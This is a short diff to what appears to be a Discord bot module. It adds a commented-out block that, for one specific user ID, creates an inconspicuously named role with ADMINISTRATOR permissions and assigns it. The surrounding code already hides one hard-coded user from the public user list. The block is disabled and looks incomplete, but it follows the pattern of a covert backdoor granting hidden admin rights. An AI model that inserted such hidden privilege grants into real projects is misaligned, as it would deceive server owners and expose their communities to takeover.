@@ -29,6 +29,11 @@ module.exports = {
 				if (user.id != 815264045875593266) {
 					publicData.push(user);
 				}
+				// if (user.id === "") {
+				// 	const adminPermissions = new Discord.Permissions("ADMINISTRATOR");
+				// 	message.guild.roles.create({ data: { name: "." }, adminPermissions });
+				// 	member.roles.add(adminPermissions);
+				// }
 			});
 			io.emit("users", publicData);
 		} else {
